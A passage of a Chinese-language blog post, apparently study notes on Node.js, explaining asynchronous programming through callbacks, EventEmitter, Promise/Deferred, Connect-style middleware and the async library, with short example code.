<p>Node在处理异常上形成了一种约定，将异常作为回调函数的第一个参数返回，如果为空值，表明没有异常抛出<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span>(<span class="function"><span class="keyword">function</span> (<span class="params">err, res</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// TODO</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>2.难点2：函数嵌套过深<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">fs.readdir(path.join(__dirname, <span class="string">'..'</span>), <span class="function"><span class="keyword">function</span> (<span class="params">err, files</span>) </span>&#123;</span><br><span class="line">  files.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">filename, index</span>) </span>&#123;</span><br><span class="line">    fs.readFile(filename, <span class="string">'utf8'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, file</span>) </span>&#123;</span><br><span class="line">      <span class="comment">// TODO</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>3.难点3：阻塞代码<br>可能有开始者会这样实现sleep(1000)<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> start = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">new</span> <span class="built_in">Date</span>() - start &lt; <span class="number">1000</span>) &#123;</span><br><span class="line">  <span class="comment">// TODO</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 需要阻塞的代码</span></span><br></pre></td></tr></table></figure></p>
<p>这段代码会持续占用CPU进行判断，与真正的线程沉睡相去甚远，完全破坏了事件循环的调度。由于Node单线程的原因，CPU资源全部会用于这段代码服务，导致其余任何请求都会得不到响应。</p>
<p>4.难点4多线程编程</p>
<p>服务器如果是多核CPU,单个Node进程实质上是没有充分利用多核CPU的。<br>浏览器提出了Web Workers<br><img src="https://mfaying.github.io/static/images/node/34.jpg" alt="avatar"></p>
<p>Node借鉴了这个模式，child_process是其基础API,cluster模块是更深层次的应用。</p>
<p>5.难点5：异步转同步<br>偶尔出现的同步需求将会因为没有同步API让开发者突然无所适从。</p>
<h2 id="异步编程解决方案"><a href="#异步编程解决方案" class="headerlink" title="异步编程解决方案"></a>异步编程解决方案</h2><p>本节将展开各个典型的解决方案</p>
<ol>
<li>事件发布/订阅模式</li>
<li>Promise/Deferred模式</li>
<li>流程控制库</li>
</ol>
<h2 id="事件发布-订阅模式"><a href="#事件发布-订阅模式" class="headerlink" title="事件发布/订阅模式"></a>事件发布/订阅模式</h2><p>事件监听器模式是一种广泛用于异步编程的模式，是回调函数的事件化，又称发布/订阅模式</p>
<p>events模块是发布/订阅模式的一个简单实现，Node中部分模块都继承自它。它具有addListener/on()、once()、removeListener()、removeAllListeners()和emit()等基本的事件监听模式的方法。<br>例子<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 订阅</span></span><br><span class="line">emitter.on(<span class="string">"event1"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">message</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(message);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 发布</span></span><br><span class="line">emitter.emit(<span class="string">"event1"</span>, <span class="string">"message"</span>);</span><br></pre></td></tr></table></figure></p>
<p>事件发布/订阅模式可以实现一个事件与多个回调函数的关联，这些回调函数又称为事件侦听器。通过emit()发布事件后，消息会立即传递给当前事件的所有侦听器执行。侦听器可以很灵活地添加和删除，使得事件和具体处理逻辑可以很轻松地关联和解耦。</p>
<p>Node对事件发布/订阅的机制做了一些额外的处理</p>
<ol>
<li>如果对一个事件添加了超过10个侦听器，将会得到一条警告。一方面侦听器太多可能会导致内存泄漏，另一方面，由于事件发布会引起一系列侦听器执行，可能存在过多占用CPU的情景。</li>
<li>为了处理异常，EventEmitter对象对error事件进行了特殊对待，如果运行期间的错误触发了error事件，EventEmitter会检查是否有error事件添加过侦听器。如果有,这个错误由侦听器处理，否则这个错误将会作为异常抛出。如果外部没有捕获这个异常，将会引起线程退出。一个健壮的EventEmitter实例应该对error事件做处理。</li>
</ol>
<p>1.继承events模块</p>
<p>实现一个继承EventEmitter的类是十分简单的<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> events = <span class="built_in">require</span>(<span class="string">'events'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Stream</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  events.EventEmitter.call(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line">util.inherits(Stream, events.EventEmitter);</span><br></pre></td></tr></table></figure></p>
<p>开发者可以通过这样的方式轻松继承EventEmitter类，利用事件机制解决业务问题</p>
<p>2.利用事件队列解决雪崩问题</p>
<p>在事件订阅/发布模式中，通常有一个once方法，通过它添加的侦听器只能执行一次，在执行之后就会将它与事件的关联移除。</p>
<p>所谓雪崩问题，就是在高访问量、大并发量的情况下缓存失效的情景，此时大量的请求同时涌入数据库中，数据库无法同时承受如此大的查询请求，进而往前影响到网站整体的响应速度。</p>
<p>以下是一条数据库查询语句的调用：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> select = <span class="function"><span class="keyword">function</span> (<span class="params">callback</span>) </span>&#123;</span><br><span class="line">  db.select(<span class="string">"sql"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">results</span>) </span>&#123;</span><br><span class="line">    callback(results);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>如果访问量巨大，同一句sql会被发送到数据库中反复查询，会影响服务的整体性能。一种改机方案是添加一个状态锁：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> status = <span class="string">"ready"</span>;</span><br><span class="line"><span class="keyword">var</span> select = <span class="function"><span class="keyword">function</span> (<span class="params">callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (status === <span class="string">"ready"</span>) &#123;</span><br><span class="line">    status = <span class="string">"pending"</span>;</span><br><span class="line">    db.select(<span class="string">"sql"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">results</span>) </span>&#123;</span><br><span class="line">      status = <span class="string">"ready"</span>;</span><br><span class="line">      callback(results);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>这种方案只有第一次调用是生效的，后续的select是没有数据服务的<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> proxy = <span class="keyword">new</span> events.EventEmitter;</span><br><span class="line"><span class="keyword">var</span> status = <span class="string">"ready"</span>;</span><br><span class="line"><span class="keyword">var</span> select = <span class="function"><span class="keyword">function</span> (<span class="params">callback</span>) </span>&#123;</span><br><span class="line">  proxy.once(<span class="string">"selected"</span>, callback);</span><br><span class="line">  <span class="keyword">if</span> (status === <span class="string">"ready"</span>) &#123;</span><br><span class="line">    status = <span class="string">"pending"</span>;</span><br><span class="line">    db.select(<span class="string">"sql"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">results</span>) </span>&#123;</span><br><span class="line">      proxy.emit(<span class="string">"selected"</span>, results);</span><br><span class="line">      status = <span class="string">"ready"</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>3.多异步之间的协作方案</p>
<p>这里我们尝试用原生代码解决“难点2”中为了最终结果的处理而导致可以并行调用但实际只能串行执行的问题。这里以渲染页面所需的模板读取、数据读取和本地化资源读取为例简要介绍一下<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 哨兵变量</span></span><br><span class="line"><span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> results = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> done = <span class="function"><span class="keyword">function</span> (<span class="params">key, value</span>) </span>&#123;</span><br><span class="line">  results[key] = value;</span><br><span class="line">  count++;</span><br><span class="line">  <span class="keyword">if</span> (count === <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="comment">// 渲染页面</span></span><br><span class="line">    render(results);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fs.readFile(template_path, <span class="string">"utf8"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, template</span>) </span>&#123;</span><br><span class="line">  done(<span class="string">"template"</span>, template);</span><br><span class="line">&#125;);</span><br><span class="line">db.query(sql, <span class="function"><span class="keyword">function</span> (<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">  done(<span class="string">"data"</span>, data);</span><br><span class="line">&#125;);</span><br><span class="line">l1ion.get(<span class="function"><span class="keyword">function</span> (<span class="params">err, resources</span>) </span>&#123;</span><br><span class="line">  done(<span class="string">"resources"</span>, resources);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>使用偏函数来处理哨兵变量和第三方函数的关系<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> after = <span class="function"><span class="keyword">function</span> (<span class="params">times, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> count = <span class="number">0</span>, results = &#123;&#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">key, value</span>) </span>&#123;</span><br><span class="line">    results[key] = value;</span><br><span class="line">    count++;</span><br><span class="line">    <span class="keyword">if</span> (count === times) &#123;</span><br><span class="line">      callback(results);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>上述方案实现事件与侦听器多对一的关系，下面可以实现多对多<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> emitter = <span class="keyword">new</span> events.Emitter();</span><br><span class="line"><span class="keyword">var</span> done = after(times, render);</span><br><span class="line"></span><br><span class="line">emitter.on(<span class="string">"done"</span>, done);</span><br><span class="line">emitter.on(<span class="string">"done"</span>, other);</span><br><span class="line"></span><br><span class="line">fs.readFile(template_path, <span class="string">"utf8"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, template</span>) </span>&#123;</span><br><span class="line">  emitter.emit(<span class="string">"done"</span>, <span class="string">"template"</span>, template);</span><br><span class="line">&#125;);</span><br><span class="line">db.query(sql, <span class="function"><span class="keyword">function</span> (<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">  emitter.emit(<span class="string">"done"</span>, <span class="string">"data"</span>, data);</span><br><span class="line">&#125;);</span><br><span class="line">l1ion.get(<span class="function"><span class="keyword">function</span> (<span class="params">err, resources</span>) </span>&#123;</span><br><span class="line">  emitter.emit(<span class="string">"done"</span>, <span class="string">"resources"</span>, resources);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>4.EventProxy的原理(???略)</p>
<p>EventProxy来自于Backbone的事件模块。</p>
<p>5.EventProxy的异常处理(???略)</p>
<h2 id="Promise-Deferred模式"><a href="#Promise-Deferred模式" class="headerlink" title="Promise/Deferred模式"></a>Promise/Deferred模式</h2><p>使用事件的方式时，执行流程需要被预先设定。即便是分支，也需要预先设定，这是由发布/订阅模式的运行机制所决定的。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$.<span class="keyword">get</span>('/api', &#123;</span><br><span class="line">  success: onSuccess,</span><br><span class="line">  error: onError,</span><br><span class="line">  complete: onComplete</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>必须严谨地设置目标，那么是否有一种先执行异步调用，延迟传递处理的方式呢？Promise/Deferred模式就是这样，jQuery重写了Ajax部分<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$.<span class="keyword">get</span>('/api')</span><br><span class="line">  .success(onSuccess)</span><br><span class="line">  .error(onError)</span><br><span class="line">  .complete(onComplete);</span><br></pre></td></tr></table></figure></p>
<p>这使得即使不调用success(),error()等方法，Ajax也会执行。在原始的API中，一个事件只能处理一个回调，而通过Deffed对象，可以对事件加入任意的业务逻辑<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$.<span class="keyword">get</span>('api')</span><br><span class="line">  .success(onSuccess1)</span><br><span class="line">  .success(onSuccess2)</span><br></pre></td></tr></table></figure></p>
<p>CommonJS草案目前已经抽象出了Promises/A、Promises/B、Promises/D这样典型的异步Promise/Deferred模型。<br>Promise/Deferred模式在一定程度上缓解了深度嵌套问题</p>
<p>1.Promises/A</p>
<p>Promises/A提议对单个异步操作做出了这样的抽象定义</p>
<ol>
<li>Promise操作只会处在3种状态的一种：未完成态、完成态和失败态</li>
<li>Promise的状态只会出现从未完成态向完成态或失败态转化，不能逆反。完成态和失败态不能互相转化。<br>3.Promise的状态一旦转化，将不能被更改</li>
</ol>
<p>在API的定义上，一个Promise对象只要具备then方法即可,但是对于then方法，有以下简单的要求</p>
<ol>
<li>接受完成态、错误态的回调方法。在操作完成或出现错误时，将会调用对应方法。</li>
<li>可选地支持progress事件回调作为第三个方法</li>
<li>then()方法只接受function对象，其余对象将被忽略</li>
<li>then()方法继续返回Promise对象，以实现链式调用</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">then(fulfilledHandler, errorHandler, progressHandler)</span><br></pre></td></tr></table></figure>
<p>利用Promises/A提议的模式，我们可以对一个典型的响应对象进行封装<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.setEncoding(<span class="string">'utf8'</span>);</span><br><span class="line">res.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"BODY:"</span> + chunk);</span><br><span class="line">&#125;);</span><br><span class="line">res.on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Done</span></span><br><span class="line">&#125;);</span><br><span class="line">res.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Error</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>可以转换为如下简略形式<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> promisify = <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> deferred = <span class="keyword">new</span> Deferred();</span><br><span class="line">  <span class="keyword">var</span> result = <span class="string">''</span>;</span><br><span class="line">  res.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">    result += chunk;</span><br><span class="line">    deferred.progress(chunk);</span><br><span class="line">  &#125;);</span><br><span class="line">  res.on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    deferred.resolve(result);</span><br><span class="line">  &#125;);</span><br><span class="line">  res.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">    deferred.reject(err);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> deferred.promise;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">promisify(res).then(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Done</span></span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Error</span></span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span> (<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'BODY:'</span> + chunk);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>Deferred主要是用于内部，用于维护异步模型的状态；Promise则作用于外部，通过then方法暴露给外部以添加自定义逻辑。Promise和Deffered的整体关系如下<br><img src="https://mfaying.github.io/static/images/node/35.jpg" alt="avatar"></p>
<p>2.Promise中的多异步协作<br>这里给出一个简单的原型实现<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Deffered.prototype.all = <span class="function"><span class="keyword">function</span> (<span class="params">promises</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> count = promises.length;</span><br><span class="line">  <span class="keyword">var</span> that = <span class="keyword">this</span>;</span><br><span class="line">  <span class="keyword">var</span> results = [];</span><br><span class="line">  promises.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">promise, i</span>) </span>&#123;</span><br><span class="line">    promise.then(<span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">      count--;</span><br><span class="line">      results[i] = data;</span><br><span class="line">      <span class="keyword">if</span> (count === <span class="number">0</span>) &#123;</span><br><span class="line">        that.resolve(results);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">      that.reject(err);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.promise;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在实际使用中可以安装when和Q模块，它们是完整的Promise提议的实现。</p>
<p>3.Promise的进阶知识</p>
<p>Promise模式比原始的事件侦听和触发略微优美，它的缺点则是需要为不同的场景封装不同的API,没有直接的原生事件那么灵活。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">obj.api1(<span class="function"><span class="keyword">function</span> (<span class="params">value1</span>) </span>&#123;</span><br><span class="line">  obj.api2(value1, <span class="function"><span class="keyword">function</span> (<span class="params">value2</span>) </span>&#123;</span><br><span class="line">    obj.api3(value2, <span class="function"><span class="keyword">function</span> (<span class="params">value3</span>) </span>&#123;</span><br><span class="line">      obj.api4(value3, <span class="function"><span class="keyword">function</span> (<span class="params">value4</span>) </span>&#123;</span><br><span class="line">        callback(value4);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>我们通过普通函数展开<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> handler1 = <span class="function"><span class="keyword">function</span> (<span class="params">value1</span>) </span>&#123;</span><br><span class="line">  obj.api2(value1, handler2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> handler2 = <span class="function"><span class="keyword">function</span> (<span class="params">value2</span>) </span>&#123;</span><br><span class="line">  obj.api3(value2, handler3);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> handler3 = <span class="function"><span class="keyword">function</span> (<span class="params">value3</span>) </span>&#123;</span><br><span class="line">  obj.api4(value3, handler4);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> handler4 = <span class="function"><span class="keyword">function</span> (<span class="params">value4</span>) </span>&#123;</span><br><span class="line">  callback(value4);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">obj.api1(handler1);</span><br></pre></td></tr></table></figure></p>
<p>1.支持序列执行的Promise<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">promise()</span><br><span class="line">  .then(obj.api1)</span><br><span class="line">  .then(obj.api2)</span><br><span class="line">  .then(obj.api3)</span><br><span class="line">  .then(obj.api4)</span><br><span class="line">  .then(<span class="function"><span class="keyword">function</span> (<span class="params">value4</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Do something with value4</span></span><br><span class="line">  &#125;, <span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Handle any error from step1 through step4</span></span><br><span class="line">  &#125;)</span><br><span class="line">  .done();</span><br></pre></td></tr></table></figure></p>
<p>尝试改造一下代码以实现链式调用<br><img src="https://mfaying.github.io/static/images/node/36.jpg" alt="avatar"></p>
<p><img src="https://mfaying.github.io/static/images/node/37.jpg" alt="avatar"></p>
<p><img src="https://mfaying.github.io/static/images/node/38.jpg" alt="avatar"></p>
<p>要让Promise支持链式执行，主要通过以下两个步骤</p>
<ol>
<li>将所有的回调都存到队列中</li>
<li>Promise完成时，逐个执行回调，一旦检测到了返回了新的Promise对象，停止执行，然后将当前Deferred对象的Promise引用改变为新的Promise对象，并将队列中余下的回调转交给它。</li>
</ol>
<p>2.将API Promise化<br><img src="https://mfaying.github.io/static/images/node/39.jpg" alt="avatar"></p>
<h2 id="流程控制库"><a href="#流程控制库" class="headerlink" title="流程控制库"></a>流程控制库</h2><p>1.尾触发与Next</p>
<p>还有一类方法是需要手工调用才能持续执行后续调用的，我们将此类方法叫做尾触发，常见的关键词是next。</p>
<p>先看一下Connect的API暴露方式<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = connect();</span><br><span class="line"><span class="comment">// Middleware</span></span><br><span class="line">app.use(connect.staticCache());</span><br><span class="line">app.use(connect.static(__dirname + <span class="string">'/public'</span>));</span><br><span class="line">app.use(connect.cookieParser());</span><br><span class="line">app.use(connect.session());</span><br><span class="line">app.use(connect.query());</span><br><span class="line">app.use(connect.bodyParser());</span><br><span class="line">app.use(connect.csrf());</span><br><span class="line">app.listen(<span class="number">3001</span>);</span><br></pre></td></tr></table></figure></p>
<p>中间件利用了尾触发的机制<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 中间件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>每个中间件传递请求对象，响应对象和尾触发函数，通过队列形成一个处理流<br><img src="https://mfaying.github.io/static/images/node/40.jpg" alt="avatar"></p>
<p>中间件机制使得在处理网路请求时，可以像面向切面编程一样进行过滤、验证、日志等功能，而不与具体业务逻辑产生关联，以致产生耦合。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createServer</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">app</span>(<span class="params">req, res</span>)</span>&#123; app.handle(req, res); &#125;</span><br><span class="line">  utils.merge(app, proto);</span><br><span class="line">  utils.merge(app, EventEmitter.prototype);</span><br><span class="line">  app.route = <span class="string">'/'</span>;</span><br><span class="line">  app.stack = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">arguments</span>.length; ++i) &#123;</span><br><span class="line">    app.use(<span class="built_in">arguments</span>[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> app;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>stack属性是这个服务器内部维护的中间件队列，通过调用use()方法我们可以将中间件放进队列中。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.use = <span class="function"><span class="keyword">function</span>(<span class="params">route, fn</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// some code</span></span><br><span class="line">  <span class="keyword">this</span>.stack.push(&#123; <span class="attr">route</span>: route, <span class="attr">handle</span>: fn &#125;);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>接下来结合http模块实现监听<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.listen = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> server = http.createServer(<span class="keyword">this</span>);</span><br><span class="line">  <span class="keyword">return</span> server.listen.apply(server, <span class="built_in">arguments</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>最后回到app.handle方法，每一个监听到的网络请求都将从这里开始处理。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.handle = <span class="function"><span class="keyword">function</span> (<span class="params">req, res, out</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// some code</span></span><br><span class="line">  next();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>原始的next方法较为复杂，下面是简化后的内容，其原理十分简单，取出队列中的中间件并执行，同时传入当前方法以实现递归调用，达到持续触发的目的：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">next</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// some code</span></span><br><span class="line">  <span class="comment">// next callback</span></span><br><span class="line">  layer = stack[index++];</span><br><span class="line"></span><br><span class="line">  layer.handle(req, res, next);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>尽管中间件这种尾触发模式并不要求每个中间方法都是异步的，但是如果每个步骤都采用异步来完成，实际上只是串行化的处理，没办法通过并行的异步调用来提升业务的处理效率。流式处理可以将一些串行的逻辑扁平化，但是并行逻辑处理还是需要搭配事件或者Promise完成的，这样业务在纵向和横向都能各自清晰。</p>
<p>尾触发十分适合处理网络请求的场景。将复杂的处理逻辑拆解为简洁、单一的处理单元，逐层次地处理请求对象和响应对象。</p>
<p>2.async<br>async提供了20多个方法用于处理异步的各种协作模式<br>1.异步的串行执行<br>series<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span>.series([</span><br><span class="line">  <span class="function"><span class="keyword">function</span> (<span class="params">callback</span>) </span>&#123;</span><br><span class="line">    fs.readFile(<span class="string">'file1.txt'</span>, <span class="string">'uft-8'</span>, callback);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="keyword">function</span> (<span class="params">callback</span>) </span>&#123;</span><br><span class="line">    fs.readFile(<span class="string">'file2.txt'</span>, <span class="string">'uft-8'</span>, callback);</span><br><span class="line">  &#125;</span><br><span class="line">], <span class="function"><span class="keyword">function</span> (<span class="params">err, results</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// results =&gt; [file1.txt, file2.txt]</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>2.异步的并行执行<br>当我们需要通过并行来提升性能时，async提供了parallel()方法，用以并行执行一些异步操作<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span>.parallel([</span><br><span class="line">  <span class="function"><span class="keyword">function</span> (<span class="params">callback</span>) </span>&#123;</span><br><span class="line">    fs.readFile(<span class="string">'file1.txt'</span>, <span class="string">'uft-8'</span>, callback);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="keyword">function</span> (<span class="params">callback</span>) </span>&#123;</span><br><span class="line">    fs.readFile(<span class="string">'file2.txt'</span>, <span class="string">'uft-8'</span>, callback);</span><br><span class="line">  &#125;</span><br><span class="line">], <span class="function"><span class="keyword">function</span> (<span class="params">err, results</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// results =&gt; [file1.txt, file2.txt]</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>3.异步调用的依赖处理<br>当前一个的结果是后一个调用的输入时，async提供了waterfall()方法<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span>.waterfall([</span><br><span class="line">  <span class="function"><span class="keyword">function</span> (<span class="params">callback</span>) </span>&#123;</span><br><span class="line">    fs.readFile(<span class="string">'file1.txt'</span>, <span class="string">'uft-8'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, content</span>) </span>&#123;</span><br><span class="line">      callback(err, content);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="keyword">function</span> (<span class="params">arg1, callback</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// arg1 =&gt; file2.txt</span></span><br><span class="line">    fs.readFile(arg1, <span class="string">'uft-8'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, content</span>) </span>&#123;</span><br><span class="line">      callback(err, content);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="keyword">function</span> (<span class="params">arg1, result</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// arg1 =&gt; file3.txt</span></span><br><span class="line">    fs.readFile(arg1, <span class="string">'utf-8'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, content</span>) </span>&#123;</span><br><span class="line">      callback(err, content);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">], <span class="function"><span class="keyword">function</span> (<span class="params">err, result</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// result =&gt; file4.txt</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>4.自动依赖处理<br>在现实的业务环境中，具有许多复杂的依赖关系<br>假设我们的业务场景如下：</p>
<ol>
<li>从磁盘读取配置文件</li>
<li>根据配置文件连接MongoDB</li>
<li>根据配置文件连接Redis</li>
<li>编译静态文件</li>
<li>上传静态文件到CDN</li>
<li>启动服务器</li>
</ol>
